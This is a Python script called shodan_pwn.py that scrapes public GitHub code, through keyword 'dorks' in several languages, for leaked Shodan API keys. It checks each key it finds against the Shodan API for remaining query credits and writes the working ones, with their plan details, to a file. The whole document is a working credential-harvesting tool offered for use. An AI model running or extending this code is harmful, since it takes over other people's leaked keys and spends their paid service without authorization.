import os
import sys
import time
import datetime

try:
    from shodan import Shodan
except ImportError:
    print ("\033[91m[-] you need to install the shodan module\033[0m")
    os.system("pip3 install shodan")

try:
    from github import Github
except ImportError:
    print ("\033[91m[-] you need to install the github module\033[0m")
    os.system("pip3 install pygithub")

dateTime = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

def read_env():
    try:
        env_vars = {}

        with open(".env", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=")
                    env_vars[key] = value.strip()
        return list(env_vars.values())
    except FileNotFoundError:
        print(".env file not found")
        return False
         
def write_env(github_api_key, path_to_keys_file):
    keys = ["GITHUB_API_KEY", "PATH_TO_KEYS_FILE"]
    values = [github_api_key, path_to_keys_file]
    with open(".env", "w") as env_file:
        for i in range(len(keys)):
            env_file.write(f"{keys[i]}={values[i]}\n")

def cfile(file_name):
    with open(file_name, "w") as file:
        file.write("")

def clean(shodan_path):
    lines = []
    keyList = []
    with open(shodan_path, "r+") as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                lines.append(line)
                keyList.append(line.split(" ")[0])
    with open(shodan_path, "w") as f:
        for line in lines:
            f.write(line)

def check(key, shodan_path):
    try:
        shodan_api = Shodan(key)
        if shodan_api.info()["query_credits"] >= 50:
            print(f"\033[38;5;41m[\033[38;5;45m{dateTime}\033[38;5;41m] \033[38;5;219m- \033[32mKey found: \033[32m{key} \033[38;5;219m- \033[32mPlan: {shodan_api.info()['plan']} \033[38;5;219m- \033[32mCredits: {shodan_api.info()['query_credits']} \033[38;5;219m- \033[32mScans: {shodan_api.info()['scan_credits']}")
            with open(shodan_path, "a+") as f:
                f.write(f'{key} Plan: {shodan_api.info()["plan"]} Credits: {shodan_api.info()["query_credits"]} Scans: {shodan_api.info()["scan_credits"]} HTTPS: {shodan_api.info()["https"]} Telnet: {shodan_api.info()["telnet"]}\n')
    except:
        pass
 
def search(token, shodan_path, keyword, language):
    total_count = 0
    while True:
        try:
            api = Github(token)
            api.per_page = 1
            repos = api.search_code(language + keyword)
            total_count = repos.totalCount
        except Exception as e:
            if "rate limit" in str(e):
                print(f"\033[38;5;41m[\033[38;5;45m{dateTime}\033[38;5;41m] \033[38;5;219m- \033[91mRate limited... \033[38;5;219m- \033[38;5;93mWaiting 30 seconds")
                time.sleep(30)
            continue
        break
    for i in range(0, total_count):
        while True:
            try:
                lines = str(repos.get_page(i)[0].decoded_content, "utf-8").split("\n")
                for line in lines:
                    original = line
                    line = line.strip().lower().replace(' ', '')
                    if keyword + '"' in line:
                        split = original.split('"')
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)
                    elif keyword + "'" in line:
                        split = original.split("'")
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)
            except Exception as e:
                if "rate limit" in str(e):
                    print(f"\033[38;5;41m[\033[38;5;45m{dateTime}\033[38;5;41m] \033[38;5;219m- \033[91mRate limited... \033[38;5;219m- \033[38;5;93mWaiting 30 seconds")
                    time.sleep(30)
                continue
            break

def handler(git_token, out_key):
    keyword_files = os.listdir("dorks/")
    language = None
    total_files = len(keyword_files)
    total_dorks = 0
    for current_file, keyword_file in enumerate(keyword_files, start=1):
        if "python" in keyword_file:
            language = "language:python "
        elif "js" in keyword_file:
            language = "language:javascript "
        elif "go" in keyword_file:
            language = "language:go "
        elif "java" in keyword_file:
            language = "language:java "
        elif "c" in keyword_file:
            language = "language:c "
        else:
            continue
        keyword_list = []
        with open("dorks/" + keyword_file, "r") as f:
            if f.readable() and not f.read().strip():
                continue
            f.seek(0)
            for l in f.readlines():
                keyword_list.append(l.strip())
        total_dorks = len(keyword_list)
        print(f"\033[38;5;41m[\033[38;5;45m{dateTime}\033[38;5;41m] \033[38;5;219m- \033[38;5;41m[\033[38;5;226mFile {current_file}/{total_files}\033[38;5;41m] \033[38;5;219m- \033[38;5;93mSearching with language \033[38;5;219m~> \033[38;5;41m'\033[38;5;226m{language}\033[38;5;41m'\033[38;5;41m\033[38;5;41m (\033[38;5;226m{keyword_file}\033[38;5;41m)")
        try:
            for current_dork, keyword in enumerate(keyword_list, start=1):
                print(f"\033[38;5;41m[\033[38;5;45m{dateTime}\033[38;5;41m] \033[38;5;219m- \033[38;5;41m[\033[38;5;226mDork {current_dork}/{total_dorks}\033[38;5;41m] \033[38;5;219m- \033[38;5;93mSearching with query \033[38;5;219m~> \033[38;5;41m'\033[38;5;226m{keyword}\033[38;5;41m'\033[0m")
                search(git_token, out_key, keyword, language)
            clean(out_key)
        except Exception as e:
            print("\n\033[91mError: " + str(e) + "\033[0m\n")
            exit()


try:
    if os.name == "nt": os.system("cls")
    else: os.system("clear")
    ascii_art = """\033[32m\n                       Started!
                        _______________
    (my eye) -> (0) ==c(___(o(______(_()   (api keys on github)
                            \=\\
                             )=\\
                            //|\\\\
                           //|| \\\\  <- (telescope)
                          // ||  \\\\
                         //  ||   \\\\
                        //         \\\\
\033[0m"""
    if len(sys.argv) != 3:
        creds = read_env()
        print("""\033[91m
                          ┌─┐┬ ┬┌─┐┌┬┐┌─┐┌┐┌   ┌─┐┬ ┬┌┐┌
                          └─┐├─┤│ │ ││├─┤│││   ├─┘││││││
                          └─┘┴ ┴└─┘─┴┘┴ ┴┘└┘───┴  └┴┘┘└┘    
               ┌──────────────────────────────────────────────────┐ 
       ┌───────┤                \033[95mCredits: \033[94mgithub/9xN\033[91m               ├───────┐
       │       └──────────────────────────────────────────────────┘       │
       │ \033[93m$ \033[38;5;147mpython3 shodan_pwn.py <github-api-token> <keys.out> \033[92mor\033[38;5;147m prompts\033[91m │
       └──────────────────────────────────────────────────────────────────┘
        \033[0m""")
        if creds[0] == "" or creds[1] == "":
            git_key = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your github api key \033[38;5;219m~>\033[38;5;111m ")
            key_out = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your output file that you would like to store found keys in \033[38;5;219m~>\033[38;5;111m ")
            cfile(key_out)
            write_env(git_key, key_out)
            print(ascii_art)
            handler(git_key, key_out)
        else: 
            print(ascii_art)
            cfile(creds[1])
            handler(creds[0], creds[1])
    else:
        git_key = sys.argv[1]
        key_out = sys.argv[2]
        cfile(key_out)
        print(ascii_art)
        handler(git_key, key_out)
except KeyboardInterrupt:
    exit()
